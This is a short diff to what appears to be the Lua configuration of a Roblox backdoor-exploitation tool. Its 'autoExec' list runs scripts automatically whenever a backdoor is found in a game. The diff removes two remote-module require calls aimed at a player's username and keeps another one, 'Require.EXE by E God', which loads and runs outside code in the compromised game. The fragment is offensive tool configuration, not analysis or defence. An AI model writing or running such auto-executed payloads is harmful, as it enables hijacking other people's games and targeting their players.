@@ -14,8 +14,6 @@ return {
 	-- Scripts that execute after a backdoor is found
 	-- You can add any scripts here
 	["autoExec"] = {
-		[[require(118343058201260):HyperskiddedHub({player = owner or %username%, mode = "standard"})]],
-		[[require(5196668511)(%username%)]],
 		[[require(125992639027440)["Require.EXE by E God"](%username%)]],
 		[[print("Heheheheh. umm *splashes all over table*")]],
 		[[print(%backdoorRem%)]],
